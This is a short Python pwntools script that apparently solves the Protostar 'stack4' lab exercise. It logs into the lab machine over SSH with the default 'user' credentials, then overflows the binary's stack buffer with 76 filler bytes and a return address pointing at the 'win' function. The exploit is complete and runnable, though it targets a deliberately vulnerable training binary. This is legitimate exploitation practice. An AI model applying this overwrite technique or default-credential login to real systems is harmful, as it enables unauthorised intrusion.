#!/usr/bin/env python
from pwn import *
import sys

winAddr = 0x80483fa
offset = 76
if len(sys.argv) < 2:
    print("usage: ./%s <ip>" % sys.argv[0])
else:
    s = ssh("user", sys.argv[1], 22, password="user")
    payload = "A"* offset
    payload += p32(winAddr) # addr to win
    payload += '\n'
    r = s.run('/opt/protostar/bin/stack4')
    r.send(payload)
    print(r.recv(1024))
    r.close()

